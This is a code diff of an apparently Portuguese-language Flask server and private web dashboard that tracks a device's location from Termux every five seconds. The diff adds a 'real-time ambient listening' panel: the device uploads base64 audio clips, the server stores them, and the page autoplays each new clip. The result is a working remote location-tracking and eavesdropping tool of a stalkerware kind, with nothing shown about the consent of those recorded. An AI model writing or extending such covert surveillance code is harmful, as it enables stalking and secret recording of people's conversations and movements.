@@ -22,17 +22,21 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .search-box p { font-size: 13px; color: #64748b; margin-bottom: 15px; }
         .search-box input { width: 100%; max-width: 300px; background: #070f15; border: 1px solid #1e293b; padding: 12px; color: #34d399; font-weight: bold; text-align: center; border-radius: 6px; font-size: 16px; margin-bottom: 15px; letter-spacing: 2px; }
         .search-box button { background: #38bdf8; color: #070f15; font-weight: bold; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 13px; }
-        .search-box button:hover { background: #0ea5e9; }
         .device-section { border: 1px solid #1e293b; border-radius: 12px; background: #0d1925; padding: 15px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.4); }
         .device-title { font-size: 14px; color: #34d399; text-transform: uppercase; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 12px; display: flex; justify-content: space-between; }
         .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; }
         .info-box { background: #070f15; border: 1px solid #1e293b; padding: 10px; border-radius: 6px; }
         .info-box span { font-size: 11px; color: #64748b; display: block; text-transform: uppercase; }
         .info-box strong { font-size: 16px; color: #f1f5f9; }
-        .map-container { width: 100%; height: 300px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
+        .map-container { width: 100%; height: 280px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
         .status-tag { background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
         .error-msg { color: #f87171; font-size: 12px; margin-top: 10px; }
-        .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; }
+        .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; margin-bottom: 15px; }
+        
+        /* CONTAINER DE ÁUDIO PROFISSIONAL */
+        .audio-box { background: #070f15; border: 1px solid #1e293b; padding: 15px; border-radius: 8px; text-align: center; }
+        .audio-box span { font-size: 11px; color: #38bdf8; display: block; margin-bottom: 8px; font-weight: bold; letter-spacing: 1px; }
+        audio { width: 100%; outline: none; filter: invert(0.9) hue-rotate(180deg); }
     </style>
 </head>
 <body>
@@ -70,19 +74,22 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 <a id="lnk_maps" href="https://www.google.com/maps/search/?api=1&query={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">
                     🗺️ Abrir no Google Maps
                 </a>
+
+                <div class="audio-box">
+                    <span>🎙️ ESCUTA AMBIENTAL EM TEMPO REAL</span>
+                    <audio id="audio_player" controls src="{{ info_moto.audio_url if info_moto.audio_url else '' }}"></audio>
+                </div>
             </div>
 
             <script>
                 let lat = {{ info_moto.lat }};
                 let lon = {{ info_moto.lon }};
+                let currentAudio = "";
                 
                 const map = L.map('map_private', { zoomControl: false }).setView([lat, lon], 16);
-                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-                    attribution: 'Nexos Private'
-                }).addTo(map);
+                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {}).addTo(map);
                 let marker = L.marker([lat, lon]).addTo(map);
 
-                // Busca as coordenadas reais vindas puramente do Termux a cada 5 segundos
                 setInterval(async () => {
                     try {
                         const response = await fetch('/api/status/{{ id_buscado }}');
@@ -96,6 +103,14 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                             marker.setLatLng(newPos);
                             map.panTo(newPos);
                             document.getElementById('lnk_maps').href = `https://www.google.com/maps/search/?api=1&query=${data.lat},${data.lon}`;
+                            
+                            // Se chegar um áudio novo e diferente, atualiza o player e toca automático
+                            if (data.audio_b64 && data.audio_b64 !== currentAudio) {
+                                currentAudio = data.audio_b64;
+                                const player = document.getElementById('audio_player');
+                                player.src = "data:audio/mp3;base64," + data.audio_b64;
+                                player.play().catch(e => console.log("Aguardando clique para tocar"));
+                            }
                         }
                     } catch (e) { console.log("Erro de sincronização"); }
                 }, 5000);
@@ -133,13 +148,17 @@ def update():
     device_id = data['device_id']
     
     if device_id not in db_dispositivos:
-        db_dispositivos[device_id] = {}
+        db_dispositivos[device_id] = {"audio_b64": ""}
         
     db_dispositivos[device_id]["battery"] = data.get("battery", "N/A")
     db_dispositivos[device_id]["storage"] = data.get("storage", "N/A")
     db_dispositivos[device_id]["uptime"] = data.get("uptime", "Ativo")
     db_dispositivos[device_id]["lat"] = float(data.get("lat", -16.6869))
     db_dispositivos[device_id]["lon"] = float(data.get("lon", -49.2648))
+    
+    if data.get("audio_b64"):
+        db_dispositivos[device_id]["audio_b64"] = data.get("audio_b64")
+        
     return jsonify({"status": "success"}), 200
 
 if __name__ == '__main__':
